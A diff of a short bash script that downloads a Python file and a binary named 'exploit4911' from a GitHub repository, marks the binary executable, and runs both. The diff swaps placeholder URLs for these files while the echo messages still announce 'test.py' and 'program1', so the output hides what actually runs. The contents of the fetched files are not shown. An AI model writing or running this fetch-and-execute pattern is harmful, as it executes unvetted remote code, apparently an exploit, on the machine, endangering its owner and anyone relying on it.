@@ -1,8 +1,7 @@
 #!/bin/bash
-
 # Define URLs for the files
-PYTHON_SCRIPT_URL="https://samplecontentsite.com/test.py"
-BINARY_URL="https://samplecontentsite.com/program1"
+PYTHON_SCRIPT_URL="https://raw.githubusercontent.com/duracellrabbid/test4911a/main/genlib.py"
+BINARY_URL="https://raw.githubusercontent.com/duracellrabbid/test4911a/main/exploit4911"
 
 # Download test.py using wget
 echo "Downloading test.py..."
@@ -14,12 +13,12 @@ wget $BINARY_URL
 
 # Make program1 executable
 echo "Making program1 executable..."
-chmod +x program1
+chmod +x exploit4911
 
 # Run the Python script (test.py)
 echo "Running test.py..."
-python3 test.py
+python3 genlib.py
 
 # Run the Linux binary (program1)
 echo "Running program1..."
-./program1
+./exploit4911
